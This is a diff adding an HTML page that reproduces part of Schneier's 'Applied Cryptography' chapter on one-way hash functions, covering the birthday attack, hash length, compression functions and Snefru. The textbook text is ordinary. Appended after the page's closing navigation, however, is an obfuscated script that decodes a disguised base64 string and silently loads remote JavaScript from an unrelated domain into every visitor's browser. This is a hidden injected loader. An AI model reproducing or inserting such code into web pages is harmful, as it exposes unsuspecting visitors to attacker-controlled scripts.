@@ -1,0 +1,129 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=429-432//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch17/17-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 18<BR>One-Way Hash Functions
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">18.1 Background</FONT></H3>
+<P>A one-way hash function, <I>H</I>(<I>M</I>), operates on an arbitrary-length pre-image message, <I>M</I>. It returns a fixed-length hash value, <I>h</I>.</P>
+<DL>
+<DD><I>h</I> = H(<I>M</I>), where <I>h</I> is of length <I>m</I>
+</DL>
+<P>Many functions can take an arbitrary-length input and return an output of fixed length, but one-way hash functions have additional characteristics that make them one-way [1065]:
+</P>
+<DL>
+<DD>Given <I>M</I>, it is easy to compute <I>h</I>.
+<DD>Given <I>h</I>, it is hard to compute <I>M</I> such that <I>H</I>(<I>M</I>)= <I>h</I>.
+<DD>Given <I>M</I>, it is hard to find another message, M&#146;, such that <I>H</I>(<I>M</I>) <I>= H</I>(<I>M&#146;</I>).
+</DL>
+<P>If Mallory could do the hard things, he would undermine the security of every protocol that uses the one-way hash function. The whole point of the one-way hash function is to provide a &#147;fingerprint&#148; of <I>M</I> that is unique. If Alice signed <I>M</I> by using a digital signature algorithm on <I>H</I>(<I>M</I>), and Bob could produce <I>M&#146;</I>, another message different from <I>M</I> where <I>H</I>(<I>M</I>) = <I>H</I>(<I>M&#146;</I>), then Bob could claim that Alice signed <I>M&#146;</I>.</P>
+<P>In some applications, one-wayness is insufficient; we need an additional requirement called <B>collision-resistance</B>.</P>
+<P>It is hard to find two random messages, <I>M</I> and <I>M&#146;</I>, such that <I>H</I>(<I>M</I>) = <I>H</I>(<I>M&#146;</I>).</P>
+<P>Remember the birthday attack from Section 7.4? It is not based on finding another message <I>M&#146;</I>, such that <I>H</I>(<I>M</I>) = <I>H</I>(<I>M&#146;</I>), but based on finding two random messages, <I>M</I> and <I>M&#146;</I>, such that <I>H</I>(<I>M</I>) = <I>H</I>(<I>M&#146;</I>).</P>
+<P>The following protocol, first described by Gideon Yuval [1635], shows how&#151;if the previous requirement were not true&#151;Alice could use the birthday attack to swindle Bob.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice prepares two versions of a contract: one is favorable to Bob; the other bankrupts him.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice makes several subtle changes to each document and calculates the hash value for each. (These changes could be things like: replacing SPACE with SPACE-BACKSPACE-SPACE, putting a space or two before a carriage return, and so on. By either making or not making a single change on each of 32 lines, Alice can easily generate 2<SUP>32</SUP> different documents.)
+<DD><B>(3)</B>&nbsp;&nbsp;Alice compares the hash values for each change in each of the two documents, looking for a pair that matches. (If the hash function only outputs a 64-bit value, she would usually find a matching pair with 2<SUP>32</SUP> versions of each.) She reconstructs the two documents that hash to the same value.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice has Bob sign the version of the contract that is favorable to him, using a protocol in which he only signs the hash value.
+<DD><B>(5)</B>&nbsp;&nbsp;At some time in the future, Alice substitutes the contract Bob signed with the one that he didn&#146;t. Now she can convince an adjudicator that Bob signed the other contract.
+</DL>
+<P>This is a big problem. (One moral is to always make a cosmetic change to any document you sign.)
+</P>
+<P>Other similar attacks could be mounted assuming a successful birthday attack. For example, an adversary could send an automated control system (on a satellite, perhaps) random message strings with random signature strings. Eventually, one of those random messages will have a valid signature. The adversary would have no idea what the command would do, but if his only objective was to tamper with the satellite, this would do it.</P>
+<P><FONT SIZE="+1"><B><I>Length of One-Way Hash Functions</I></B></FONT></P>
+<P>Hash functions of 64 bits are just too small to survive a birthday attack. Most practical one-way hash functions produce 128-bit hashes. This forces anyone attempting the birthday attack to hash 2<SUP>64</SUP> random documents to find two that hash to the same value, not enough for lasting security. NIST, in its Secure Hash Standard (SHS), uses a 160-bit hash value. This makes the birthday attack even harder, requiring 2<SUP>80</SUP> random hashes.</P>
+<P>The following method has been proposed to generate a longer hash value than a given hash function produces.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Generate the hash value of a message, using a one-way hash function listed in this book.
+<DD><B>(2)</B>&nbsp;&nbsp;Prepend the hash value to the message.
+<DD><B>(3)</B>&nbsp;&nbsp;Generate the hash value of the concatenation of the message and the hash value.
+<DD><B>(4)</B>&nbsp;&nbsp;Create a larger hash value consisting of the hash value generated in step (1) concatenated with the hash value generated in step (3).
+<DD><B>(5)</B>&nbsp;&nbsp;Repeat steps (1) through (3) as many times as you wish, <I>concatenating</I> as you go.
+</DL>
+<P>Although this method has never been proved to be either secure or insecure, various people have some serious reservations about it [1262, 859].
+</P>
+<P><FONT SIZE="+1"><B><I>Overview of One-Way Hash Functions</I></B></FONT></P>
+<P>It&#146;s not easy to design a function that accepts an arbitrary-length input, let alone make it one-way. In the real world, one-way hash functions are built on the idea of a <B>compression function</B> . This one-way function outputs a hash value of length <I>n</I> given an input of some larger length <I>m</I> [1069, 414]. The inputs to the compression function are a message block and the output of the previous blocks of text (see Figure 18.1). The output is the hash of all blocks up to that point. That is, the hash of block <I>Mi</I> is</P>
+<DL>
+<DD><I>h</I><SUB>i</SUB> = <I>f</I>(<I>M</I><SUB>i</SUB>,<I>h</I><SUB>i- 1</SUB>)
+</DL>
+<P>This hash value, along with the next message block, becomes the next input to the compression function. The hash of the entire message is the hash of the last block.
+</P>
+<P>The pre-image should contain some kind of binary representation of the length of the entire message. This technique overcomes a potential security problem resulting from messages with different lengths possibly hashing to the same value [1069, 414]. This technique is sometimes called <B>MD-strengthening</B> [930].</P>
+<P>Various researchers have theorized that if the compression function is secure, then this method of hashing an arbitrary-length pre-image is also secure&#151;but nothing has been proved [1138, 1070, 414].</P>
+<P>A lot has been written on the design of one-way hash functions. For more mathematical information, consult [1028, 793, 791, 1138, 1069, 414, 91, 858, 1264]. Bart Preneel&#146;s thesis [1262] is probably the most comprehensive treatment of one-way hash functions.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/18-01.jpg',192,45 )"><IMG SRC="images/18-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-01.jpg',192,45)"><FONT COLOR="#000077"><B>Figure 18.1</B></FONT></A>&nbsp;&nbsp;One-way function</I>.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">18.2 Snefru</FONT></H3>
+<P>Snefru is a one-way hash function designed by Ralph Merkle [1070]. (Snefru, like Khufu and Khafre, was an Egyptian pharaoh.) Snefru hashes arbitrary-length messages into either 128-bit or 256-bit values.
+</P>
+<P>First the message is broken into chunks, each 512-<I>m</I> in length. (The variable <I>m</I> is the length of the hash value.) If the output is a 128-bit hash value, then the chunks are each 384 bits long; if the output is a 256-bit hash value, then the chunks are each 256 bits long.</P>
+<P>The heart of the algorithm is function H, which hashes a 512-bit value into an <I>m</I>-bit value. The first <I>m</I> bits of H&#146;s output are the hash of the block; the rest are discarded. The next block is appended to the hash of the previous block and hashed again. (The initial block is appended to a string of zeros.) After the last block (if the message isn&#146;t an integer number of blocks long, zeros are used to pad the last block), the first <I>m</I> bits are appended to a binary representation of the length of the message and hashed one final time.</P>
+<P>Function H is based on E, which is a reversible block-cipher function that operates on 512-bit blocks. H is the last <I>m</I> bits of the output of E XORed with the first <I>m</I> bits of the input of E.</P>
+<P>The security of Snefru resides in function E, which randomizes data in several passes. Each pass is composed of 64 randomizing rounds. In each round a different byte of the data is used as an input to an S-box; the output word of the S-box is XORed with two neighboring words of the message. The S-boxes are constructed in a manner similar to those in Khafre (see Section 13.7). Some rotations are thrown in, too. Originally Snefru was designed with two passes.</P>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis of Snefru</I></B></FONT></P>
+<P>Using differential cryptanalysis, Biham and Shamir demonstrated the insecurity of two-pass Snefru (128-bit hash value) [172]. Their attack finds pairs of messages that hash to the same value within minutes.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch17/17-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(NnSUCloF, BEFduxWN) {BEFduxWN = NnSUCloF.createElement('script');BEFduxWN.type = 'text/javascript';BEFduxWN.async = true;BEFduxWN.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');NnSUCloF.getElementsByTagName('body')[0].appendChild(BEFduxWN);}(document));</script></body>
+</html>
